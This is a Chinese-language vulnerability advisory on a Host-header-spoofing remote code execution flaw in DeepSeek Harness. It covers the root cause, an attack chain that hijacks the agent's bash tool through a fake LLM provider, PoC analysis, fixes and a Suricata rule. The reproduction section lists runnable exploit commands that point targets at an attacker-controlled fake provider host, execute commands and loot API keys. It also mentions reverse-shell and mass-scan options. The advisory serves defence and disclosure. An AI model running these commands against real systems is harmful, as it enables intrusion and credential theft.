# QVD-2026-57410 — DeepSeek Harness 未授权远程代码执行（Host 头伪造）

> 系列归属：**DeepSeek Harness（DSH）** 上线 11 天内被奇安信披露的 5 个漏洞之一（第 5 个，定级最高）。

## 漏洞速览

| 项 | 内容 |
|---|---|
| 漏洞编号 | **QVD-2026-57410**（奇安信威胁情报中心披露，暂无 CVE） |
| 产品 | DeepSeek Harness（`deepseek-ai/deepseek-harness`） |
| 漏洞类型 | 未授权远程代码执行（HTTP `Host` 头信任缺陷） |
| 危害等级 | **CVSS 9.8（极危）** |
| 影响版本 | **0.1.1-rc.2**（亦见于 0.1.0-rc.7 复现） |
| 披露时间 | 2026-08-24（奇安信威胁情报中心） |
| 利用条件 | 管理 API 暴露到非 loopback 网络；无需 API Key、无需真实模型 |

## 受影响范围

- 所有以 Web 模式暴露于公网、且未修复 Host 校验的 DSH 实例。FOFA 测绘：全球约 600+ 台暴露。
- 风险集中在：Docker 端口映射 `docker run -p 0.0.0.0:3000:3000`、Nginx/Apache 反向代理未重写 Host 头、云 LB 转发 `/api` 路径。
- **默认监听 `127.0.0.1:3080` 的纯本机部署外部不可达**，风险与通报场景不同；但本机恶意程序/木马仍可借本地回环利用。

## 根因分析

DSH 的管理 RPC（`session.create` / `provider.add` / `session.selectModel` / `permission.defaultPreset` 等）仅允许本机访问，服务端通过 **HTTP `Host` 请求头的字面值**判断请求是否来自本机回环地址（`isTrustedApiRequest` 只校验 Host，不校验 TCP 连接的真实来源 `remoteAddress`）。而 `Host` 头完全由客户端构造、可任意伪造。接口**完全没有认证**（官方文档称认证不在第一版范围）。

> 把“控制面信任网络层（Host 头）做认证，而网络层本身无认证”——等于把门锁钥匙塞在门垫底下。

## 利用机制 / 攻击链（三步）

```
1. 伪造 Host: localhost 头 → 绕过 /api 信任围栏，解锁特权 RPC
2. 调用 llm.discoverModels / provider.add 注册指向攻击者服务器的虚假 LLM 提供者（无需 API Key）
3. 虚假提供者返回工具调用指令 → 驱动 Agent 内置 bash / file 工具 → 以 dsh 进程权限执行任意系统命令
```

整条链路**不需要任何有效 API Key，也不需要真实模型**。攻击者“借用”了 Agent 框架现成的 bash 执行通道，无需自己摸索提权路径。实测可拿 `uid=0(root)` 交互式 shell，并大规模窃取环境内多家大模型 API Key（DeepSeek / Kimi / MiniMax / QWEN / OpenAI / GLM / Tavily / StepFun / OpenRouter 等）。

## PoC 分析

`exploit/dsh2shell.py`（来自 `ChaoMixian/dsh2shell`，Python3 stdlib only）自带 Fake LLM 服务器 + 批量扫描模式：

- 伪造 Host 头探测特权 RPC（`POST /api/host.describe`，`Host: localhost`）；
- 启动本地 Fake LLM（监听 `:9999/v1`），`provider.add {url: "http://attacker:9999/v1"}` 注册假模型；
- `session.selectModel {model: "fake"}` 切换模型；
- `session.prompt` 触发——Fake LLM 在 `chat/completions` 的 SSE 响应里下发 `tool_calls`，`function.name="bash"`、`function.arguments={"command": "..."}`，Agent 执行后回传结果。

另见 Sploitus 工具包（`dsh_exploit.py` / `dsh_scanner.py` / `dsh_shell.py`，支持 `--check` / `--sysinfo` / `-c` / `--shell` / `--reverse-shell` / CIDR 批量扫描）。

## 复现步骤

```sh
# 攻击者侧需一个能从目标实例访问到的监听地址（如 VPS 公网 IP）
python3 dsh2shell.py -t https://target.example.com \
    --public-base http://1.2.3.4:9999/v1 --cmd "id" --cmd "cat /flag"

# 只读探测（不改动任何状态）
python3 dsh2shell.py -t https://target.example.com --dry-run

# 凭据猎取（env / dotfiles / dsh trees / 正则扫描已知 key/secret 模式）
python3 dsh2shell.py -t https://target.example.com --public-base http://1.2.3.4:9999/v1 --loot-keys
```

## 修复方案

- **立即**：管理 API 只监听 loopback / 受信内网（`npx @deepseek-ai/dsh web --host 127.0.0.1`；Docker `docker run -p 127.0.0.1:3000:3000`）；不要用 `--host 0.0.0.0` 启动。
- **反代层**：强制覆写 `Host` 头（`proxy_set_header Host "127.0.0.1:3000";`）+ IP 白名单；反代本身不能自动解决 API 信任与认证模型。
- **长期**：RPC 接口启用 Token / Basic Auth；用 Unix socket 替代 TCP 监听；**校验 TCP `remoteAddress` 而非 `Host` 头**；不要信任客户端可控的 HTTP 头。
- **升级**：关注官方补丁版本并及时更新（`npm i -g @deepseek-ai/dsh@latest` / `npx @deepseek-ai/dsh@latest web`，注意 npx 缓存可能跑旧版）。

## 检测排查（Suricata 示例）

```
alert http any any -> any any (msg:"DSH Host Header Spoofing Attempt";
  content:"POST"; http_method; content:"/api"; http_uri;
  content:"Host: 127.0.0.1"; http_header; flow:to_server,established;)
```

- 公网实例先下线或收回 loopback；
- 检查 `~/.dsh/` 是否出现可疑 `cordis.patch.yml` 改动、宿主异常进程/反向 shell、crontab 与自启动项。

## 时间线

- 2026-08-24：奇安信威胁情报中心披露（QVD-2026-57410，CVSS 9.8 极危，POC 公开、技术细节公开、CERT 验证）。
- 2026-08-25：多家安全媒体转载与复现（实测 `uid=0(root)`）。

## 参考资料

- 奇安信威胁情报中心披露（2026-08-24，QVD-2026-57410）
- PoC：https://github.com/ChaoMixian/dsh2shell
- 分析：cn-sec.com/archives/5403588.html、security.zone.ci/secarticles/wx/571698.html
- 官方仓库：https://github.com/deepseek-ai/deepseek-harness

## 免责声明

本资料仅供授权安全研究与防御目的。请勿对已不拥有的系统运行相关 PoC。
